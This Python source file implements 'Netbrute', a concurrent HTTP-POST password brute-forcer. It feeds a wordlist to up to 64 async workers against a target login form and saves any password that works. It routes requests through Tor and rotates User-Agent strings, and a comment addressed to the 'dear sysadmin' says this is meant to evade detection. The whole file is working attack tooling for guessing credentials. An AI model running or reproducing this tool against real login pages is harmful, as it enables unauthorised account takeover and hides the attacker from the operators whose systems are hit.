import asyncio
import aiohttp
import random
import os
import time
import gzip
import yarl
from netbruter.tor import get_tor_connector, parse_proxy_address
from netbruter.user_agent import get_user_agents
from copy import copy
# noinspection PyPackageRequirements
from progressbar import ProgressBar, Bar, Counter, Percentage, AdaptiveETA
from aiohttp.errors import ClientResponseError, TimeoutError


try:
    from asyncio import JoinableQueue as Queue
except ImportError:
    from asyncio import Queue
    from asyncio import Event


class Netbrute:
    """
    HTTP-POST BruteForcer
    """
    def __init__(self, loop, pre_url=None, pre_payload=None, target_url=None, login=None, payload_model=None, wordlist=None, error_string=None, tasks=64, tor=None, tor_address=None, debug=None):
        self.max_tasks = tasks
        self.queue = Queue()
        self.pre_url = pre_url
        self.pre_payload = self._generate_payload_type(pre_payload)
        self.attack_url = target_url
        self.login = login
        self.error_string = [x.strip() for x in error_string.split(',')]
        self.payload = self._generate_payload_type(payload_model)
        self.wordlist = wordlist
        self.found = Event()
        self.tor_use = tor
        #self.session = self._generate_new_session(loop)
        self.debug = debug
        self.runned_passwords = set()
        self.old_passwds = set()
        self.restore_files = []
        self.progress_bar = None
        self.ua = self._prepare_user_agents()
        self.start_time = time.time()
        self.last_report_time = time.time()

        # Statuses set of settings
        self.loaded_passwords = 0
        self.tried_passwords = 0
        self.error_passwords = 0
        self.max_passwords = 0

        # Tor set of settings
        if self.tor_use is not None and tor_address is not None:
            ip, port = parse_proxy_address(tor_address)
            self.tor_address = "http://{0}:{1}".format(ip, port)
            self.tor_address_string = tor_address

        # Session set of settings
        self.session_name = self._generate_session_name()
        restore_files = self._search_open_sesssion()
        if restore_files > 0:
            for file in self.restore_files:
                if self._load_old_session(file) is True:
                    break
        else:
            pass

    @staticmethod
    def _prepare_user_agents():
        #  Load user agents
        ua = get_user_agents()
        if not ua:
            raise Exception("No user agents available")
        return ua

    def _load_old_session(self, fn):
        """
        Function to ask user input and decide to use or not to use restore files.
        This also decompress (if it can) and reads data, storing it inside the main object.
        :param fn: String => Filename
        :return: Boolean
        """

        question = input("\n[*] Do you want to load passwords from file '{0}'? [y/N] ".format(os.path.basename(fn)))

        if question.upper() == "Y":
            try:
                #  Decompress the data and store it raw
                with gzip.open(fn, "rb", compresslevel=9) as f:
                    _data = f.read()
                with open(fn, "wb") as f:
                    f.write(_data)
            except:
                #  If decompression fails, probably it is not compressed.
                #  So we will open it and read, as it should.
                with open(fn, "rb") as f:
                    _data = f.read()

            #  Read data from file, decode it from BinaryBuffer to String.
            lines = [x.decode() for x in _data.split(b"\n")]

            #  Finally, add each line to old_passwords set.
            for line in lines:
                if line != "":
                    self.old_passwds.add(line)

            #  Define the session name as the restore file used.
            self.session_name = os.path.basename(fn)
            return True
        else:
            return False

    def _search_open_sesssion(self):
        current_dir = os.getcwd() + os.sep
        for root, dirc, files in os.walk(current_dir):
            for f in files:
                if f.endswith(".restore"):
                    file_path = os.path.join(root, f)
                    self.restore_files.append(file_path)
        return len(self.restore_files)

    @staticmethod
    def _generate_session_name():
        _id = hex(random.randint(0, 999999))
        return "session_{0}.restore".format(_id[2:])

    @staticmethod
    def _generate_payload_type(user_input):
        """
        Function responsible for transforming String type into Dictionary type
        :param user_input: str
        :return: d: dict
        """
        d = dict()
        p = [x.strip() for x in user_input.split(",")]
        for element in p:
            key, value = element.split(":")
            d[key] = value
        return d

    @staticmethod
    def _encode_payload_www(unencoded_payload):
        """
        Function responsible for transforming a dictionary payload into x-www-form-urlencoded payload
        :param unencoded_payload:
        :return:
        """
        pl = str()
        dict_len = len(unencoded_payload)
        i = 1
        for key in unencoded_payload:
            if i != dict_len:
                pl += "{0}={1}&".format(key, unencoded_payload[key])
            else:
                pl += "{0}={1}".format(key, unencoded_payload[key])
            i += 1
        return pl

    def _adjust_payload(self, payload, password=None, login=None):
        """
        Creates a copy from payload supplied by user, then formats it with attack data.
        :param password: String
        :return: tmp_payload: String
        """
        tmp_payload = copy(payload)
        for key in tmp_payload:
            value = tmp_payload[key]
            if value.upper() == "PASS":
                #  Modify the payload prototype with the queue's password.
                if password is not None:
                    tmp_payload[key] = password

            elif value.upper() == "LOGIN":
                #  Modify the payload prototype with the supplied login
                if login is not None:
                    tmp_payload[key] = login
            else:
                continue
        return tmp_payload

    @staticmethod
    def _store_data(fn, data):
        """
        Stores buffer of data into a file and adds a new line at the end of it.
        :param fn: String => Filename for a file
        :param data: String => Data buffer
        :return: None
        """
        data += "\n"
        with open(fn, "a") as f:
            f.write(data)
        return

    def _increment_progress_bar(self):
        """
        Check if one second has passed since last report, then renewal the progress bar with current attack progress
        :return: None
        """
        if (time.time() - self.last_report_time) < 1:
            return
        self.last_report_time = time.time()
        self.progress_bar.update((self.max_passwords - self.loaded_passwords) + self.tried_passwords)

    def _parse_response(self, status, response_url, passwd):
        """
        Parses the response packet based on http status code and response URL
        :param status: Integer => HTTP status code
        :param response_url: String => Request URL response
        :param passwd: String => Password that originated this response
        :return: None
        """
        for error_string in self.error_string:
            if type(response_url is yarl.URL):
                response_url = response_url.query_string
            if error_string in response_url:
                self.tried_passwords += 1
                self.runned_passwords.add(passwd)
                if len(self.runned_passwords) % 100 == 0:
                    [self._store_data(self.session_name, x) for x in self.runned_passwords]
                    self.runned_passwords.clear()
                return
        if status == 200:
            print("\n[+] Password was found: {0}".format(passwd))
            print("[*] Response URL: {0}".format(response_url))
            self._store_data("correct.pass", passwd)
            self._store_data("correct.pass", "{0}\n\n".format(self.payload))
            self.found.set()
        return


    async def pre_page_request(self, session):
        #  Use tor or not
        if self.tor_use is True:
            proxy_addr = self.tor_address
        else:
            proxy_addr = None

        #  We will always create new headers for you, dear sysadmin...
        headers = {
            "content-type": "application/x-www-form-urlencoded",
            "User-Agent": random.choice(self.ua),
        }

        #  Generate the payload
        custom_payload = self._adjust_payload(self.pre_payload, login=self.login)

        # Do the first request.
        async with session.post(self.pre_url, data=self._encode_payload_www(custom_payload), headers=headers, proxy=proxy_addr) as response:
            status, response_url = response.status, response.url
            if status == 200:
                return 0, headers
            else:
                return 1, headers


    async def attack_this(self, session, password, headers=None):
        """
        Perform IO operation for http request
        :param password: String => Password used in the attack
        :return: None
        """
        if self.debug:
            print("Started attack!")

        #  We need a header if not previously;
        if headers is None:
            headers = {
                "content-type": "application/x-www-form-urlencoded",
                "User-Agent": random.choice(self.ua),
            }

        custom_payload = self._adjust_payload(self.payload, password=password)

        # AsyncTimeout removed since commit c47781f
        #  with async_timeout.timeout(10):
        if self.tor_use is True:
            proxy_addr = self.tor_address
        else:
            proxy_addr = None
        async with session.post(self.attack_url, data=self._encode_payload_www(custom_payload), headers=headers, proxy=proxy_addr) as response:

            status, response_url = response.status, response.url

            self._parse_response(status, response_url, password)

            if self.debug is False:
                self._increment_progress_bar()

            if self.debug:
                print("Ended attack! [{0}] - Status: {1} - URL: {2}".format(password, status, response_url))
        return

    def _parse_wordlist(self, iterable):
        return list(filter(lambda x: x not in self.old_passwds, iterable))

    def _read_wordlist(self):
        tmp_list = []
        with open(self.wordlist, "r") as f:
            for line in f.readlines():
                tmp_list.append(line.replace("\n", ""))
        parsed_list = self._parse_wordlist(tmp_list)
        for element in parsed_list:
            self.queue.put_nowait(element)
        self.max_passwords = len(tmp_list)
        self.loaded_passwords = len(parsed_list)
        return len(parsed_list)


    def _generate_new_session(self, loop):
        #  Create cookie jar
        jar = aiohttp.CookieJar(unsafe=True)

        #  Adjust session object and tor usage information
        if self.tor_use is True:
            #print("[+] Using tor with address {0}\n".format(self.tor_address_string))
            conn = get_tor_connector(self.tor_address_string)
            session = aiohttp.ClientSession(loop=loop, cookie_jar=jar, connector=conn)
        else:
            session = aiohttp.ClientSession(loop=loop, cookie_jar=jar)
        return session

    @asyncio.coroutine
    def work(self, loop):
        while not self.queue.empty():
            #  Create new aiohttp session
            session = self._generate_new_session(loop)
            # Check if password is found and throw queue away
            if self.found.is_set():
                # noinspection PyProtectedMember
                for _ in range(len(self.queue._queue)):
                    yield from self.queue.get()

            #  Retrieve passwords from queue and test them
            password = yield from self.queue.get()

            # Do the request and deal with timeout
            try:
                k, headers = yield from self.pre_page_request(session)
                if k == 0:
                    yield from self.attack_this(session, password, headers=headers)
            except Exception as e:
                if self.debug:
                    print("Password '{0}' request timed out.".format(password))
                    print("Error: {0}\n".format(e))
                self.queue.put_nowait(password)
                pass
            session.close()
            self.queue.task_done()

    @asyncio.coroutine
    def initiate(self, loop):

        #  Attack preparation phase
        if self.debug:
            print("Started initiation!")
        pass_number = self._read_wordlist()
        print("\n[*] Program have read {0} passwords.\n".format(pass_number))

        #  Graphical visualization of attack status
        self.progress_bar = ProgressBar(widgets=
                                        ["Guesses: ", Counter(), "/", str(self.max_passwords),
                                         " [", Percentage(), "] ", Bar(marker="#"), " ", AdaptiveETA()],
                                        maxval=self.max_passwords).start()
        self.progress_bar.update(self.max_passwords - pass_number)

        #  Now the code to run the tasks and execute the async requests
        workers = [asyncio.Task(self.work(loop)) for _ in range(self.max_tasks)]
        yield from self.queue.join()
        for w in workers:
            w.cancel()
        if self.debug:
            print("Ended initiation!")

